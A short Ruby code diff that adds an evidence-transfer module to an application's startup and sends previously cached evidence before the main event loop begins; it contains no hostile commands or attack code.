@@ -6,6 +6,7 @@
 require_relative 'events.rb'
 require_relative 'config.rb'
 require_relative 'db.rb'
+require_relative 'evidence_transfer.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -81,6 +82,9 @@ class Application
       # if some instance are still in SYNC_IN_PROGRESS status, reset it to
       # SYNC_TIMEOUT. we are starting now, so no valid session can exist
       EvidenceManager.instance.sync_timeout_all
+
+      # transfer all the previously cached evidence, if any
+      EvidenceTransfer.instance.send_cached
 
       # enter the main loop (hopefully will never exit from it)
       Events.new.setup Config.instance.global['LISTENING_PORT']
